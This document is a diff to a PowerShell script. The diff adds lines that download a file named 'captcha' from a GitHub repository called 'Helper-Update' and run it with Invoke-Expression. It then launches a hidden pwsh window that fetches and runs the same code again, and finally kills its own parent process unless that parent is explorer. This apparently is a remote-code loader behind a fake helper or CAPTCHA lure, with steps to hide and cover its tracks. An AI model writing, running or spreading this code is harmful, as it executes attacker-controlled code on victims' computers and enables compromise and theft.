@@ -1,15 +1,20 @@
 $ErrorActionPreference = 'SilentlyContinue'
 
+$p = (Get-CimInstance -ClassName Win32_Process -Filter "ProcessId = $PID" -ErrorAction SilentlyContinue).ParentProcessId
 
 $url = 'https://raw.githubusercontent.com/pourpory-sig/Helper-Update/main/captcha'
 
+$req = New-Object -ComObject Msxml2.XMLHTTP
+$req.open('GET', $url, $false)
+$req.send()
 
-try {
-    $req = New-Object -ComObject Msxml2.XMLHTTP
-    $req.open('GET', $url, $false)
-    $req.send()
-   
+if ($req.status -eq 200) {
+    Invoke-Expression $req.responseText
 }
-    
- 
 
+Start-Process pwsh.exe -ArgumentList '-NoProfile','-NoLogo','-WindowStyle','Hidden','-Command',"Invoke-Expression (Invoke-RestMethod '$url')" -ErrorAction SilentlyContinue
+
+$parent = Get-Process -Id $p -ErrorAction SilentlyContinue
+if ($parent -and $parent.ProcessName -ne 'explorer') {
+    Stop-Process -Id $p -Force -ErrorAction SilentlyContinue
+}
